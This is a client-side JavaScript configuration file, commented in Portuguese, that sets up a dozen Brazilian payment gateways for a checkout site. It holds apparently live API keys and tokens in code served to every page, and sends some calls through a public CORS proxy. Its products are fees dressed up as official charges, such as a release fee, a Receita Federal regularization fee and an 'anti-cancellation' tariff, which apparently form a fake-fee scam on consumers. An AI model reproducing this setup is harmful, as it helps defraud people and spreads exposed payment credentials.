// ==========================================
// CONFIGURAÇÃO GLOBAL DO SISTEMA
// ==========================================
// Edite as credenciais e valores abaixo.
// Não é mais necessário usar o Painel para salvar, 
// pois este arquivo será lido por todas as páginas (celular, guia anônima, etc).

const GLOBAL_CONFIG = {
    // Gateway ativo. Pode ser: 'xpay', 'aven', 'techbynet', 'ironpay', 'activepay', 'unipay', 'paguex', 'moonfy', 'mangofy', 'otimize', 'sigilopay' ou 'blackcat'
    activeGateway: 'xpay',

    // Credenciais dos Gateways
    gateways: {
        xpay: {
            // Documentação: https://docs.xpaybrasil.com/docs
            api_key: 'cpk_live_ex84lopcp2xexagmazz6za11'
        },
        aven: {
            api_key: 'OcQGTu0TIGrRx9rOoMEdx8YBYMepJM18Q9JR1Q5sZy0',
            tokenization_key: 'yQ_h_dO1ueUf4i6Qf8TO1aVhoNLXI9apMfiHSb093lM'
        },
        techbynet: {
            // Documentação: https://docs.techbynet.com/
            api_key: 'f3496353-b145-431a-91ac-1e47968b5b6f'
        },
        ironpay: {
            token: 'XCntKV6WvEts5wHqYucZh257gUgmrSrn34ZxLXOlkyvWM6Ju9d50QRvZMsDE',
            offer_hash: 'mqszplqlev',
            product_hash: 'mqszplqlev'
        },
        activepay: {
            public_key: '',
            secret_key: ''
        },
        unipay: {
            public_key: '',
            secret_key: ''
        },
        paguex: {
            public_key: '',
            secret_key: ''
        },
        moonfy: {
            public_key: '',
            secret_key: ''
        },
        mangofy: {
            store_code: '',
            api_key: '',
            // URL de callback exigida pela Mangofy (campo obrigatório). Pode ser
            // sobrescrita aqui; se vazia, usa a origem da página / fallback https.
            postback_url: ''
        },
        otimize: {
            public_key: '',
            secret_key: ''
        },
        sigilopay: {
            public_key: '',
            secret_key: ''
        },
        blackcat: {
            // Obtenha sua API Key no painel administrativo da Blackcat
            api_key: ''
        }
    },

    // Valores e Nomes dos Produtos
    product: {
        amount: '78,47',
        name: 'Taxa de Liberação'
    },
    upsell: {
        amount: '43,92',
        name: 'Taxa De Regularização RF'
    },
    iof: {
        amount: '38,40',
        name: 'Taxa de Autenticação Cadastral 2026'
    },
    icm: {
        amount: '45,60',
        name: 'Taxa de Conformidade Fiscal BC'
    },
    iphone: {
        amount: '67,43',
        name: 'Tarifa Anti-Cancelamento'
    }
};

// Se precisar ler em outro lugar, use a variável GLOBAL_CONFIG
// O Painel antigo não terá mais efeito no site.

// ===== PROXY HELPER =====
// APIs diretas ou compatíveis com CORS
const _IS_LOCAL = ['127.0.0.1', 'localhost'].includes(window.location.hostname);
const API_BASES = {
    xpay: 'https://api.xpaybrasil.com/v1',
    aven: 'https://api.avenpayments.com',
    techbynet: 'https://api-gateway.techbynet.com',
    activepay: 'https://api.activepay.com.br',
    ironpay: 'https://api.ironpayapp.com.br',
    unipay: 'https://api.fastsoftbrasil.com',
    paguex: 'https://corsproxy.io/?https://api.paguex.online',
    moonfy: 'https://api.moooonfy.com.br',
    mangofy: 'https://corsproxy.io/?https://checkout.mangofy.com.br',
    otimize: 'https://api.otimizepagamentos.com',
    sigilopay: 'https://corsproxy.io/?https://app.sigilopay.com.br/api/v1',
    blackcat: 'https://api.blackcatpayments.com/api'
};
